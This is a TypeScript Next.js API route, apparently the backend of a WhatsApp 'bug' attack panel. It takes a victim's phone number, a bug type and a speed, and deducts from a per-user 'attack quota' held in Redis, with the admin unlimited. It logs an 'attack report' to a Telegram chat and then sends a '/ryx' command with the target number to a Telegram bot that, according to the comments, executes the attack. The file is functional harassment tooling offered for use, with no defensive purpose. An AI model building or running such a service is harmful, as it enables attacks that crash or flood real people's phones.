import { NextResponse } from 'next/server';
import { Redis } from '@upstash/redis';

const redis = new Redis({ 
  url: process.env.UPSTASH_REDIS_REST_URL!, 
  token: process.env.UPSTASH_REDIS_REST_TOKEN! 
});

export async function POST(req: Request) {
  const { username, targetNumber, selectedBug, engineSpeed, senderType, senderNumber } = await req.json();
  
  // 1. Pengecekan Akun Terdaftar
  const userData = await redis.get(`user:${username}`) as any;
  if (userData?.locked) {
    return NextResponse.json({ success: false, error: "Akun lu di-lock oleh Admin!" }, { status: 403 });
  }

  // 2. Kalkulasi Limit Khusus Non-Admin (Free Member)
  let currentLimit = userData?.limit !== undefined ? Number(userData.limit) : 5;
  const isAdmin = username === "Leo";

  if (!isAdmin) {
    if (senderType === "global" && currentLimit <= 0) {
      return NextResponse.json({ success: false, error: "Limit kuota serangan lu udah abis!" }, { status: 403 });
    }
    // Kurangi limit 1 poin
    currentLimit = Math.max(0, currentLimit - 1);
    await redis.set(`user:${username}`, JSON.stringify({ ...userData, limit: currentLimit }));
  }

  // 3. Eksekusi Kirim Log Laporan Serangan ke Telegram
  const sisaLimitText = isAdmin ? "UNLIMITED (👑 ADMIN)" : `${currentLimit}/5`;
  const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username}\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${sisaLimitText}\n📱 *Sender Mode:* ${senderType.toUpperCase()}`;
  
  const token = process.env.TELE_TOKEN;
  const chatId = "6481060681";

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: attackMsg, parse_mode: 'Markdown' })
  });

  // 4. Kirim Command Utama Eksekutor WA Bot (/ryx) setelah 1 detik
  setTimeout(async () => {
    const commandShortMsg = (senderType === "pribadi" && senderNumber)
      ? `/ryx ${targetNumber} ${senderNumber}`
      : `/ryx ${targetNumber}`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: commandShortMsg, parse_mode: 'Markdown' })
    });
  }, 1000);

  return NextResponse.json({ success: true, nextLimit: currentLimit });
}
